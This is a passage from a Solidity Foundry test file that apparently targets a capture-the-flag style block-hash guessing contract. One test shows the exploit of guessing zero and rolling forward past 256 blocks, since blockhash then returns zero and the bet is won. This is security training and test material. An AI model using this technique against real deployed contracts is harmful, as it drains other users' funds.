        bytes32 answer = blockhash(guessBlock);
        
        _contractUnderTest.settle();
        
        bool shouldWin = (zeroHash == answer);
        if (shouldWin) {
            assertEq(address(this).balance, 1 ether, "Should have won 1 ether profit");
        } else {
            assertEq(address(this).balance, 0, "Should have lost the bet");
        }
    }

    function test_forceWinByWaiting256Blocks() public {
        uint256 initialBlock = 1000;
        uint256 guessBlock = initialBlock + 1;
        
        vm.roll(initialBlock);
        _contractUnderTest.lockInGuess{value: 1 ether}(0);
        
        vm.roll(guessBlock + 256);
        
        bytes32 expectedHash = blockhash(guessBlock);
        assertEq(expectedHash, 0, "Blockhash for blocks older than 256 should be zero");
        
